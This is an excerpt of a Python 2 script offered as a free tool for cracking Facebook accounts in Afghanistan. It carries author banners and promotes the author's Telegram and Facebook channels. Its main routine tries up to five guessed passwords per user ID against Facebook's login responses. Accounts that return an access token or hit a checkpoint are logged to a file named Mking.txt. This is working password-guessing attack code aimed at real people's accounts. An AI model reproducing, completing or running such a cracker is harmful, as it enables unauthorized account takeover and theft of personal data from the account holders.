# MY TELEGRAM CHANNEL @mula_mohammad 
# MY TELEGRAM GROUP @AFG_PU
#MY GITHUB HTTPS://GITHUB.COM/MAMAD181281
#THIS SCRIPT FREE 
...
def youtube():
	Style_profaisor("  please follow my facebook account :) Thank you")
	os.system("xdg-open https://www.facebook.com/Mula.asm81")
	menu()
...
def telegram():
	...
	os.system("xdg-open https://t.me/mula_mohammad")
...
\033[1;93m      |(_) |( ) ( )| |  _  /'_` )
\033[1;94m       ||  | || (_) || |_( )( (_| |
\033[1;95m      (_) (_)`\___/'(____/'`\__,_)
                            
\033[1;97m--------------------------------------------------
\033[1;91m Author        : DacTar MaMad Kunduzi 
\033[1;91m GitHub        : https://github.com/Mamad181281
\033[1;91m YouTube       : MaMad Tech
\033[1;91m Telegram CH   : https://t.me/mula_mohammad 
\033[1;91m TLEGRAM GP    : https://t.me/mula_mamad 
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY ASM MOBARAK WAHIDY '
        print '\x1b[1;92m THISE SCRIPT CREATED BY ASM MOBARAK WAHIDY '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[MAMAD-OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[MAMAD_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[MAMAD_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[MAMAD_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[MAMAD_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[MAMAD_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[MAMAD_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[MAMAD_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[MAMAD_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[MAMAD_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
